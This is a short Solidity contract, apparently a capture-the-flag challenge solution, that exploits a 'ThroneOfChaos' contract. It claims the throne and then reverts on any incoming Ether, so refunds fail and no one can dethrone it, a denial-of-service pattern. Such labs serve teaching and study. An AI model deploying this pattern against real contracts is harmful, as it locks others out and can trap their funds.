// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title EternalRuler
 * @dev A cunning contract designed to exploit the ThroneOfChaos and 
 * seize control forever. 
 * 
 * By invoking the dark secret, the EternalRuler aims to lock the throne,
 * preventing any future claims.
 * 
 * Author: Lucas Martin Calderon
 * Challenge: Use this contract to unveil and exploit the throne's vulnerability.
 */
interface IThroneOfChaos {
    function claimThrone() external payable;
}

contract EternalRuler {
    IThroneOfChaos public throneOfChaos;

    constructor(address _throneOfChaos) {
        throneOfChaos = IThroneOfChaos(_throneOfChaos); 
    }

    function seizeControl() public payable {
        throneOfChaos.claimThrone{value: msg.value}();
    }

    // Prevent dethroning by rejecting any incoming Ether.
    receive() external payable {
        revert("The throne cannot be claimed anymore.");
    }
}
